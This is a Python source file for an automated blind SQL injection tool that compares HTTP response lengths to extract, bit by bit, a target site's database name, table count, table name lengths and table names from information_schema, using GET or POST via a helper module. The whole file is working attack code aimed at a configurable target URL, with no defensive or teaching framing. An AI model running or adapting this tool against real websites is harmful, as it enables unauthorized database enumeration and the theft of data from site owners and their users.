import requests
import bitwise_public


class GetDbTableInformationClass:
    def __init__(self):
        self.SUCCESS_LENGTH = len(requests.get(bitwise_public.TARGET_URL).text)
        # Using DB name length
        self.db_name_length = 0
        # Using DB name
        self.db_name = ""
        # Tables number in DB
        self.tables_number = 0
        # List of tables name length in DB
        self.tables_name_length = []
        # List of tables name in DB
        self.tables_name = []

    # SQL Injection method
    def get_db_name_length(self, method=bitwise_public.HTTPMethod.GET):
        length_bin_list = []
        query = 'db_name()'

        for shift_idx in range(7, -1, -1):
            res_length = bitwise_public.get_length_by_post_method(query, shift_idx) if method == bitwise_public. \
                HTTPMethod.POST else bitwise_public.get_length_by_get_method(query, shift_idx)
            length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

        self.db_name_length = bitwise_public.parsing_bin_list_to_decimal(length_bin_list)
        print(self.db_name_length)

    def get_db_name(self, method=bitwise_public.HTTPMethod.GET):
        # one character list, not string
        db_name_char_list = []
        query = 'db_name()'

        for db_name_idx in range(self.db_name_length):
            db_name_char_bin_list = []
            for shift_idx in range(7, -1, -1):
                res_length = bitwise_public.get_data_by_post_method(query, db_name_idx, shift_idx, 0) if method == \
                             bitwise_public.HTTPMethod.POST else bitwise_public.get_data_by_get_method(query,
                                                                                                       db_name_idx + 1,
                                                                                                       shift_idx,
                                                                                                       0)
                db_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

            db_name_char_list.append(bitwise_public.parsing_bin_list_to_char(db_name_char_bin_list))

        self.db_name = ''.join(db_name_char_list)
        print(self.db_name)

    def get_tables_number(self, method=bitwise_public.HTTPMethod.GET):
        number_bin_list = []
        query = """select count(*) from information_schema.tables where table_schema = '{0}'""".format(self.db_name)

        for shift_idx in range(7, -1, -1):
            # Need know DB name
            res_length = bitwise_public.get_count_by_post_method(query, shift_idx) if method == bitwise_public \
                .HTTPMethod.POST else bitwise_public.get_count_by_get_method(query, shift_idx)
            number_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

        self.tables_number = bitwise_public.parsing_bin_list_to_decimal(number_bin_list)
        print(self.tables_number)

    def get_tables_length(self, method=bitwise_public.HTTPMethod.GET):
        for table_idx in range(self.tables_number):
            query = """select TABLE_NAME from information_schema.tables where table_schema = '{0}'
                       limit {1},1""".format(self.db_name, table_idx)
            tables_length_bin_list = []

            for shift_idx in range(7, -1, -1):
                res_length = bitwise_public.get_length_by_post_method(query, shift_idx) if method == bitwise_public. \
                    HTTPMethod.POST else bitwise_public.get_length_by_get_method(query, shift_idx)
                tables_length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

            self.tables_name_length.append(bitwise_public.parsing_bin_list_to_decimal(tables_length_bin_list))

        print(self.tables_name_length)

    def get_tables_name(self, method=bitwise_public.HTTPMethod.GET):
        query = """select TABLE_NAME from information_schema.tables 
                   where table_schema = '{0}'
                   """.format(self.db_name)
        for table_idx in range(self.tables_number):
            table_char_list = []
            for table_name_idx in range(self.tables_name_length[table_idx]):
                table_name_char_bin_list = []
                for shift_idx in range(7, -1, -1):
                    res_length = bitwise_public.get_data_by_post_method(query, table_name_idx, shift_idx, table_idx) \
                        if method == bitwise_public.HTTPMethod.POST \
                        else bitwise_public.get_data_by_get_method(query, table_name_idx + 1, shift_idx, table_idx)

                    table_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

                table_char_list.append(bitwise_public.parsing_bin_list_to_char(table_name_char_bin_list))

            self.tables_name.append(''.join(table_char_list))

    # Getter
    def db_name_getter(self):
        return self.db_name

    def tables_name_getter(self):
        return self.tables_name


if __name__ == '__main__':
    test_class = GetDbTableInformationClass()

    test_class.get_db_name_length()
    test_class.get_db_name()
    test_class.get_tables_number()
    test_class.get_tables_length()
    test_class.get_tables_name()

    print(test_class.db_name_getter())
    print(test_class.tables_name_getter())
